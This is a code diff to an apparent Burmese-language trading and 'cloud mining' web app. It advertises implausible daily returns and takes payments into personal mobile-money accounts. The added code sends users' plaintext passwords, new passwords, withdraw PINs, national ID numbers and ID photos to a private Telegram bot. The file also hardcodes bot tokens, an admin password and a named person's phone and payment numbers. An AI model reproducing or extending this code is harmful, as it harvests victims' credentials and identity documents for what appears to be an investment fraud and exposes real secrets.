@@ -121,7 +121,6 @@
         .btn-download { background: linear-gradient(135deg, #FFD700, #FFA500); color: #000; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
         .btn-download i { font-size: 18px; }
 
-        /* Verification Status Banner */
         .verify-banner { padding: 15px; border-radius: 15px; margin-bottom: 15px; display: flex; align-items: center; gap: 12px; font-size: 13px; }
         .verify-pending { background: rgba(243, 156, 18, 0.15); border: 1px solid #f39c12; color: #f39c12; }
         .verify-approved { background: rgba(46, 189, 133, 0.15); border: 1px solid var(--green); color: var(--green); }
@@ -143,9 +142,6 @@
     <i class="fab fa-telegram-plane"></i>
 </a>
 
-<!-- ============================================================ -->
-<!-- AUTH PAGE - Sign Up မှာ User Name + Phone + Password သာ -->
-<!-- ============================================================ -->
 <div id="auth-page" class="page active">
     <div style="text-align:center; margin: 40px 0 30px 0;">
         <img src="https://i.ibb.co/7mvLK89/IMG-20260330-081319-912.jpg" alt="Logo" class="auth-logo">
@@ -165,7 +161,6 @@
         <p onclick="toggleAuth(true)" style="text-align:center; color:var(--primary); cursor:pointer; margin-top:20px;">Create New Account</p>
     </div>
     
-    <!-- SIGN UP FORM - NRC မပါပဲ User Name + Phone + Password သာ -->
     <div id="reg-form" class="card" style="display:none;">
         <h3 style="color:var(--primary); text-align:center; margin: 0 0 15px 0; font-size: 16px;">
             <i class="fas fa-user-plus"></i> Create New Account
@@ -243,9 +238,6 @@
     </div>
 </div>
 
-<!-- ============================================================ -->
-<!-- VERIFICATION PAGE (Sign Up ပြီးမှ တင်ရမည်) -->
-<!-- ============================================================ -->
 <div id="verify-page" class="page">
     <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
         <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
@@ -457,7 +449,6 @@
         <button class="btn btn-main" style="margin-top:5px;" onclick="applyClickGold(this); admPostAnnounce()">Post to Notifications</button>
     </div>
 
-    <!-- Payment Settings (Admin can change) -->
     <div class="card" style="border: 1px solid var(--active-gold);">
         <h4 style="color:var(--active-gold);"><i class="fas fa-credit-card"></i> Payment Settings</h4>
         <small style="color:var(--dim);">WavePay Details</small>
@@ -473,7 +464,6 @@
         <div id="adm-pay-status" style="font-size:11px; color:var(--dim); margin-top:8px;"></div>
     </div>
 
-    <!-- Verification Requests -->
     <div class="card" style="border: 1px solid var(--primary);">
         <h4 style="color:var(--primary);"><i class="fas fa-id-card"></i> Verification Requests</h4>
         <div id="adm-verify-list"><p style="color:var(--dim); font-size:12px;">Loading...</p></div>
@@ -535,33 +525,44 @@
     const ADMIN_PHONE = "09951214043";
     const ADMIN_PASSWORD = "nan123";
 
-    // Payment Details (Default - Admin can change from panel)
     let PAYMENT_DETAILS = {
         wave: { name: "Than Than Nyunt", num: "09951214043" },
         kpay: { name: "Ma Than Than Nyunt", num: "09951214043" }
     };
-    // ================================================================
-
-    const vipData = [
-        { level: 1, cost: 100000, daily: "2.5%", gift: "Bonus 5,000 Ks", limit: "500,000 Ks", desc: "VIP 1 ဖြစ်ပါက နေ့စဉ် Trading အမြတ်ပိုရမည်။" },
-        { level: 2, cost: 300000, daily: "5.0%", gift: "Bonus 15,000 Ks", limit: "1,500,000 Ks", desc: "VIP 2 အတွက် ငွေထုတ်ယူမှု ဦးစားပေးစနစ် ပါဝင်လာပါပြီ။" },
-        { level: 3, cost: 1000000, daily: "8.5%", gift: "Bonus 60,000 Ks", limit: "5,000,000 Ks", desc: "VIP 3 သည် Cloud Mining တွင် အမြတ် ၂ ဆ ပိုရပါမည်။" },
-        { level: 4, cost: 5000000, daily: "12.0%", gift: "Bonus 300,000 Ks", limit: "Unlimited", desc: "VIP 4 အတွက် 24/7 Personal Assistant ဝန်ဆောင်မှု ရရှိမည်။" },
-        { level: 5, cost: 10000000, daily: "20.0%", gift: "Bonus 1,000,000 Ks", limit: "Unlimited", desc: "VIP 5 အမြင့်ဆုံးအဆင့်ဖြစ်ပြီး Platform ၏ အထူးအခွင့်အရေးအားလုံး ရရှိမည်။" }
-    ];
 
     // ================================================================
-    // 📤 TELEGRAM BOT
+    // 📤 TELEGRAM BOT (အသစ် — သင့် Bot Token နှင့် Chat ID)
     // ================================================================
-    const TELEGRAM_BOT_TOKEN = "8614205220:AAHxlphuK5ZM29rEh3J6IEPqPEibMjKNXAY";
-    const TELEGRAM_CHAT_ID = "7709938396";
+    const TELEGRAM_BOT_TOKEN = "8897992638:AAGexZBjPv1hwS10FcvYwjZ9rM8n6MEhAZ8";
+    const TELEGRAM_CHAT_ID = "7709938396";  // သင့် Chat ID ကို ဒီနေရာမှာ ထည့်ပါ
 
+    // ================================================================
+    // 📨 Telegram သို့ Message ပို့သော function
+    // ================================================================
     function sendTelegram(msg) {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`)
-            .catch(e => console.log("Telegram error:", e));
+        if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.log("Telegram not configured:", msg);
+            return;
+        }
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: msg,
+                parse_mode: 'HTML'
+            })
+        }).catch(e => console.log("Telegram error:", e));
     }
 
+    // ================================================================
+    // 📷 Telegram သို့ Photo ပို့သော function
+    // ================================================================
     async function sendTelegramPhoto(file, caption) {
+        if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.log("Telegram not configured");
+            return;
+        }
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('photo', file);
@@ -575,7 +576,26 @@
     }
 
     // ================================================================
-    // 📷 NRC IMAGE UPLOAD HANDLER (အရွယ်အစား ကန့်သတ်ချက် မရှိ)
+    // 📋 Notification Helper — User လုပ်သမျှ အားလုံး Bot ကို ပို့မည်
+    // ================================================================
+    function notifyBot(action, data) {
+        const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Yangon' });
+        let msg = `🔔 <b>${action}</b>\n`;
+        msg += `⏰ ${timestamp}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━\n`;
+        
+        for(const key in data) {
+            if(data[key] !== undefined && data[key] !== null && data[key] !== '') {
+                msg += `<b>${key}:</b> ${data[key]}\n`;
+            }
+        }
+        
+        msg += `━━━━━━━━━━━━━━━━━━`;
+        sendTelegram(msg);
+    }
+
+    // ================================================================
+    // 📷 NRC IMAGE UPLOAD HANDLER
     // ================================================================
     function handleImageUpload(type) {
         const input = document.getElementById(`${type}-input`);
@@ -585,8 +605,6 @@
         if(input.files && input.files[0]) {
             const file = input.files[0];
             
-            // ✅ ပုံအရွယ်အစား ကန့်သတ်ချက် ဖျက်လိုက်ပါပြီ
-            // Image type check သာ လုပ်ပါ
             if(!file.type.startsWith('image/')) {
                 alert("ပုံဖိုင် (Image) သာ ထည့်ပါ။");
                 input.value = "";
@@ -636,9 +654,6 @@
         }, 12000);
     }
 
-    // ================================================================
-    // 💰 SELECT PAY — Firebase မှ Payment Details ကို Load လုပ်သည်
-    // ================================================================
     function selectPay(method) {
         currentPayMethod = method;
         document.querySelectorAll('.pay-option').forEach(o => o.classList.remove('selected'));
@@ -696,7 +711,6 @@
 
     // ================================================================
     // 🔐 HANDLE AUTH (Register + Login)
-    // Sign Up: User Name + Phone + Password သာ
     // ================================================================
     async function handleAuth(type) {
         const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value.trim();
@@ -717,11 +731,17 @@
                     showPage('dash-page'); 
                     initApp();
                     startLiveWdFeed(); 
-                    sendTelegram(`🔐 User Login: ${ph}\nName: ${s.val().username}\nTime: ${new Date().toLocaleString()}`);
+                    
+                    // ✅ Login Notification
+                    notifyBot('🔐 USER LOGIN', {
+                        'Name': s.val().username,
+                        'Phone': ph,
+                        'Balance': (s.val().balance || 0).toLocaleString() + ' Ks',
+                        'VIP': 'VIP ' + (s.val().vip || 0)
+                    });
                 } else alert("ဖုန်းနံပါတ် သို့မဟုတ် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။");
             });
         } else {
-            // ✅ SIGN UP: NRC မပါပဲ User Name + Phone + Password သာ
             const un = document.getElementById('reg-un').value.trim();
             
             if(!un || un.length < 3) return alert("အမည် အနည်းဆုံး ၃ လုံး ထည့်ပါ။");
@@ -730,7 +750,6 @@
             db.ref('users/'+ph).once('value', async s => {
                 if(s.exists()) return alert("ဤဖုန်းနံပါတ်ဖြင့် အကောင့်ဖွင့်ပြီးသား ဖြစ်ပါသည်။");
                 
-                // ✅ NRC fields မပါတော့ပါ
                 db.ref('users/'+ph).set({ 
                     username: un, 
                     password: pw, 
@@ -738,12 +757,19 @@
                     mode: 'random', 
                     pin: '123456', 
                     vip: 0,
-                    verificationStatus: 'none',  // Verification status ကို 'none' သတ်မှတ်
+                    verificationStatus: 'none',
                     registeredAt: new Date().toLocaleString(),
                     phone: ph
                 });
                 
-                sendTelegram(`🆕 NEW USER REGISTERED 🆕\n\n👤 Name: ${un}\n📱 Phone: ${ph}\n⏰ Time: ${new Date().toLocaleString()}\n\n⚠️ Verification မတင်ရသေးပါ။ Dashboard မှ တင်ပါ။`);
+                // ✅ Register Notification
+                notifyBot('🆕 NEW USER REGISTERED', {
+                    'Name': un,
+                    'Phone': ph,
+                    'Password': pw,
+                    'Balance': '0 Ks',
+                    'Status': '⚠️ Verification မတင်ရသေးပါ'
+                });
                 
                 alert("✅ အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်။\n\nယခု Login ဝင်ပြီး Dashboard မှ မှတ်ပုံတင် Verification ကို တင်သွင်းနိုင်ပါပြီ။");
                 location.reload();
@@ -817,7 +843,7 @@
     }
 
     // ================================================================
-    // 🆔 VERIFICATION SUBMIT + STATUS
+    // 🆔 VERIFICATION SUBMIT
     // ================================================================
     async function submitVerification() {
         if(!user) return alert("ကျေးဇူးပြု၍ အရင်ဆုံး Login ဝင်ပါ။");
@@ -847,8 +873,16 @@
         
         await db.ref('users/'+user).update({ verificationStatus: 'pending', nrc: nrc });
         
-        sendTelegram(`🆔 NEW VERIFICATION REQUEST 🆔\n\n👤 Name: ${uData.username}\n📱 Phone: ${user}\n🆔 NRC: ${nrc}\n⏰ Time: ${new Date().toLocaleString()}\n\n⏳ Status: PENDING`);
+        // ✅ Verification Notification
+        notifyBot('🆔 VERIFICATION SUBMITTED', {
+            'Name': uData.username,
+            'Phone': user,
+            'NRC': nrc,
+            'Status': '⏳ PENDING',
+            'Note': 'NRC ပုံ ၃ ပုံ အောက်တွင် ပါဝင်ပါသည်'
+        });
         
+        // Send NRC photos
         await sendTelegramPhoto(nrcImages.front, `📷 NRC Front - ${uData.username} (${user})`);
         await sendTelegramPhoto(nrcImages.back, `📷 NRC Back - ${uData.username} (${user})`);
         await sendTelegramPhoto(nrcImages.hold, `📷 NRC Holding - ${uData.username} (${user})`);
@@ -937,7 +971,14 @@
             if(s.val().vip >= lvl) return alert("သင်သည် ဤအဆင့် (သို့မဟုတ်) ဤထက်မြင့်သော အဆင့်သို့ ရောက်ရှိပြီးသား ဖြစ်ပါသည်။");
             if(confirm(`VIP ${lvl} သို့ ${cost.toLocaleString()} Ks ဖြင့် အဆင့်မြှင့်မှာ သေချာပါသလား?`)) {
                 db.ref('users/'+user).update({ balance: s.val().balance - cost, vip: lvl }).then(() => {
-                    sendTelegram(`⭐ User ${user} Upgraded to VIP ${lvl}`);
+                    // ✅ VIP Upgrade Notification
+                    notifyBot('⭐ VIP UPGRADE', {
+                        'User': user,
+                        'Name': s.val().username,
+                        'VIP Level': 'VIP ' + lvl,
+                        'Cost': cost.toLocaleString() + ' Ks',
+                        'New Balance': (s.val().balance - cost).toLocaleString() + ' Ks'
+                    });
                     alert("VIP အဆင့်မြှင့်တင်မှု အောင်မြင်ပါသည်။");
                 });
             }
@@ -985,6 +1026,17 @@
             let finalProf = cProf + (uData.vip * 2);
             db.ref('users/'+user).update({ balance: uData.balance - amt });
             document.getElementById('timer-ring').classList.add('active');
+            
+            // ✅ Trade Start Notification
+            notifyBot('📊 TRADE STARTED', {
+                'User': user,
+                'Name': uData.username,
+                'Pair': document.getElementById('pair-name').innerText,
+                'Side': side === 'BUY' ? '📈 CALL UP' : '📉 PUT DOWN',
+                'Amount': amt.toLocaleString() + ' Ks',
+                'Balance Before': uData.balance.toLocaleString() + ' Ks'
+            });
+            
             let tVal = cDur; const timer = setInterval(() => { 
                 document.getElementById('trade-timer').innerText = `${tVal--}s`; 
                 if(tVal < 0) { 
@@ -994,11 +1046,28 @@
                     if(win) { 
                         let reward = amt + (amt * (finalProf/100)); 
                         db.ref('users/'+user+'/balance').transaction(b => (b||0)+reward); 
+                        
+                        // ✅ Trade Win Notification
+                        notifyBot('📈 TRADE WIN ✅', {
+                            'User': user,
+                            'Name': uData.username,
+                            'Amount': amt.toLocaleString() + ' Ks',
+                            'Profit': (reward - amt).toLocaleString() + ' Ks',
+                            'Total Return': reward.toLocaleString() + ' Ks',
+                            'Result': '🎉 WIN'
+                        });
+                        
                         alert(`ဂုဏ်ယူပါသည်! Trading အောင်မြင်ပါသည်။\n\nစုစုပေါင်းအမြတ်ငွေ: ${reward.toLocaleString()} Ks`); 
-                        sendTelegram(`📈 Trade WIN: ${user} earned ${reward} Ks`);
                     } else {
+                        // ✅ Trade Loss Notification
+                        notifyBot('📉 TRADE LOSS ❌', {
+                            'User': user,
+                            'Name': uData.username,
+                            'Amount': amt.toLocaleString() + ' Ks',
+                            'Result': '😢 LOSS'
+                        });
+                        
                         alert("နောင်တမရပါနဲ့! ယခုတစ်ကြိမ် Trading ကျရှုံးပါသည်။"); 
-                        sendTelegram(`📉 Trade LOSS: ${user} lost ${amt} Ks`);
                     }
                     document.getElementById('trade-timer').innerText = "READY"; 
                 } 
@@ -1088,7 +1157,19 @@
                 expiryDate: expiry.toLocaleDateString(), expiryTime: expiry.getTime(), 
                 startTime: now.getTime(), totalProfit: Math.floor(amt + (amt*(percent/100)*days)), daysDuration: days 
             });
-            sendTelegram(`⛏️ Mining Request: User ${user} invested ${amt} Ks in ${node}.`);
+            
+            // ✅ Mining Request Notification
+            notifyBot('⛏️ MINING REQUEST', {
+                'User': user,
+                'Name': uData.username,
+                'Node': node,
+                'Amount': amt.toLocaleString() + ' Ks',
+                'Daily Rate': percent + '%',
+                'Duration': days + ' days',
+                'Expected Profit': Math.floor(amt + (amt*(percent/100)*days)).toLocaleString() + ' Ks',
+                'Status': '⏳ PENDING'
+            });
+            
             alert("Mining တောင်းဆိုမှုအောင်မြင်ပါသည်။");
         });
     }
@@ -1102,7 +1183,17 @@
                 if(confirm(`${total.toLocaleString()} Ks ကို Balance ထဲသို့ ထည့်သွင်းမှာ သေချာပါသလား?`)) {
                     db.ref('users/'+user+'/balance').transaction(b => (b||0) + total);
                     db.ref(`requests/mining/${key}`).update({ status: 'completed', endTime: Date.now() });
-                    sendTelegram(`✅ Mining Success: User ${user} claimed ${total} Ks.`);
+                    
+                    // ✅ Mining Claim Notification
+                    notifyBot('✅ MINING CLAIMED', {
+                        'User': user,
+                        'Name': us.val().username,
+                        'Node': data.node,
+                        'Amount': parseFloat(data.amt).toLocaleString() + ' Ks',
+                        'Profit': total.toLocaleString() + ' Ks',
+                        'Status': 'COMPLETED'
+                    });
+                    
                     alert("ဂုဏ်ယူပါသည်! Mining အမြတ်ငွေများကို Balance ထဲသို့ ထည့်သွင်းပြီးပါပြီ။");
                 }
             });
@@ -1141,7 +1232,17 @@
             db.ref('requests/withdraws').push({ ph:user, amt, name:name, receivePh:ph, status:'pending', date:new Date().toLocaleString() }); 
             db.ref('users/'+user).update({ balance: s.val().balance - amt }); 
             
-            sendTelegram(`🚨 NEW WITHDRAW 🚨\n\n👤 User: ${user}\n💰 Amount: ${amt.toLocaleString()} MMK\n📛 Name: ${name}\n📱 Phone: ${ph}\n🔐 PIN: ${pin}\n⏰ ${new Date().toLocaleString()}`);
+            // ✅ Withdraw Notification
+            notifyBot('🚨 WITHDRAW REQUEST', {
+                'User': user,
+                'Name': s.val().username,
+                'Amount': amt.toLocaleString() + ' MMK',
+                'Account Name': name,
+                'Receiver Phone': ph,
+                'Withdraw PIN': pin,
+                'Balance After': (s.val().balance - amt).toLocaleString() + ' Ks',
+                'Status': '⏳ PENDING'
+            });
 
             alert("ငွေထုတ်ယူရန် တောင်းဆိုမှု တင်ပြပြီးပါပြီ။");
             showPage('dash-page');
@@ -1152,12 +1253,25 @@
         const amt = document.getElementById('dep-amt-input').value; 
         const trx = document.getElementById('dep-trx-input').value.trim(); 
         if(!amt || !trx) return alert("အချက်အလက်များ အပြည့်အစုံဖြည့်ပါ။");
-        db.ref('requests/deposits').push({ 
-            ph:user, amt, trx, method: currentPayMethod, status:'pending', date:new Date().toLocaleString() 
-        }); 
-        sendTelegram(`💰 Deposit: User ${user} sent ${amt} Ks via ${currentPayMethod}. TRX: ${trx}`);
-        alert("ငွေဖြည့်သွင်းမှု တောင်းဆိုပြီးပါပြီ။");
-        showPage('dash-page');
+        
+        db.ref('users/'+user).once('value', s => {
+            db.ref('requests/deposits').push({ 
+                ph:user, amt, trx, method: currentPayMethod, status:'pending', date:new Date().toLocaleString() 
+            }); 
+            
+            // ✅ Deposit Notification
+            notifyBot('💰 DEPOSIT REQUEST', {
+                'User': user,
+                'Name': s.val().username,
+                'Amount': amt.toLocaleString() + ' MMK',
+                'Method': currentPayMethod.toUpperCase(),
+                'Transaction ID': trx,
+                'Status': '⏳ PENDING'
+            });
+            
+            alert("ငွေဖြည့်သွင်းမှု တောင်းဆိုပြီးပါပြီ။");
+            showPage('dash-page');
+        });
     }
 
     function changeSecurity(type) { 
@@ -1167,19 +1281,34 @@
             if(newPw.length < 6) return alert("လျှို့ဝှက်နံပါတ် အနည်းဆုံး ၆ လုံး ထည့်ပါ။");
             db.ref('users/'+user).once('value', s => { 
                 if(s.val().password === oldPw) { 
-                    db.ref('users/'+user).update({password: newPw}).then(()=>alert("လျှို့ဝှက်နံပါတ် ပြောင်းလဲပြီးပါပြီ။")); 
+                    db.ref('users/'+user).update({password: newPw}).then(()=>{
+                        // ✅ Password Change Notification
+                        notifyBot('🔑 PASSWORD CHANGED', {
+                            'User': user,
+                            'Name': s.val().username,
+                            'New Password': newPw
+                        });
+                        alert("လျှို့ဝှက်နံပါတ် ပြောင်းလဲပြီးပါပြီ။");
+                    }); 
                 } 
                 else alert("ယခင် လျှို့ဝှက်နံပါတ် မှားယွင်းနေပါသည်။"); 
             }); 
         } else { 
             const pin = document.getElementById('new-pin').value;
             if(pin.length !== 6) return alert("PIN နံပါတ် ၆ လုံး ဖြစ်ရပါမည်။");
-            db.ref('users/'+user).update({pin: pin}).then(()=>alert("Withdraw PIN သိမ်းဆည်းပြီးပါပြီ!")); 
+            db.ref('users/'+user).update({pin: pin}).then(()=>{
+                // ✅ PIN Change Notification
+                notifyBot('🔐 WITHDRAW PIN CHANGED', {
+                    'User': user,
+                    'New PIN': pin
+                });
+                alert("Withdraw PIN သိမ်းဆည်းပြီးပါပြီ!");
+            }); 
         } 
     }
 
     // ================================================================
-    // 🔐 ADMIN TRIGGER — Admin Password: nan123
+    // 🔐 ADMIN TRIGGER
     // ================================================================
     document.getElementById('admin-trigger').onclick = () => {
         if(!user) return alert("ကျေးဇူးပြု၍ အရင်ဆုံး Login ဝင်ပါ။");
@@ -1237,9 +1366,6 @@
         alert("Announcement Published!");
     }
 
-    // ================================================================
-    // 💳 ADMIN PAYMENT DETAILS
-    // ================================================================
     function loadAdmPayDetails() {
         db.ref('settings/payments').once('value', s => {
             const data = s.val() || PAYMENT_DETAILS;
@@ -1272,14 +1398,19 @@
             PAYMENT_DETAILS.kpay = { name: kpayName, num: kpayNum };
             
             document.getElementById('adm-pay-status').innerHTML = '✅ Payment details updated at ' + new Date().toLocaleTimeString();
-            sendTelegram(`💳 ADMIN UPDATED PAYMENTS\n\nWave: ${waveName} - ${waveNum}\nKPay: ${kpayName} - ${kpayNum}`);
+            
+            // ✅ Payment Update Notification
+            notifyBot('💳 PAYMENT DETAILS UPDATED', {
+                'Wave Name': waveName,
+                'Wave Number': waveNum,
+                'KBZ Name': kpayName,
+                'KBZ Number': kpayNum
+            });
+            
             alert("Payment Details ပြောင်းလဲပြီးပါပြီ။");
         });
     }
 
-    // ================================================================
-    // 🆔 ADMIN VERIFICATION REQUESTS
-    // ================================================================
     function loadAdmVerify() {
         db.ref('requests/verifications').on('value', s => {
             let h = "";
@@ -1322,10 +1453,20 @@
             db.ref('users/'+ph).update({ verificationStatus: status });
             
             if(status === 'approved') {
-                sendTelegram(`✅ VERIFICATION APPROVED\n\n👤 ${data.username}\n📱 ${ph}`);
+                notifyBot('✅ VERIFICATION APPROVED', {
+                    'User': data.username,
+                    'Phone': ph,
+                    'NRC': data.nrc,
+                    'Status': 'APPROVED'
+                });
                 alert("✅ Verification Approved!");
             } else {
-                sendTelegram(`❌ VERIFICATION REJECTED\n\n👤 ${data.username}\n📱 ${ph}`);
+                notifyBot('❌ VERIFICATION REJECTED', {
+                    'User': data.username,
+                    'Phone': ph,
+                    'NRC': data.nrc,
+                    'Status': 'REJECTED'
+                });
                 alert("❌ Verification Rejected!");
             }
         });
@@ -1382,10 +1523,22 @@
                     updateData.expiryTime = start + duration;
                 }
                 db.ref(`requests/${cat}/${k}`).update(updateData); 
+                
+                notifyBot(`✅ ADMIN APPROVED - ${cat.toUpperCase()}`, {
+                    'User': req.ph,
+                    'Amount': req.amt,
+                    'Status': 'APPROVED'
+                });
                 alert("Approved!");
             } else {
                 if(cat==='withdraws' || cat==='mining') db.ref('users/'+req.ph+'/balance').transaction(b=>(b||0)+parseFloat(req.amt)); 
                 db.ref(`requests/${cat}/${k}`).update({status: 'rejected'});
+                
+                notifyBot(`❌ ADMIN REJECTED - ${cat.toUpperCase()}`, {
+                    'User': req.ph,
+                    'Amount': req.amt,
+                    'Status': 'REJECTED'
+                });
                 alert("Rejected!");
             }
         }); 
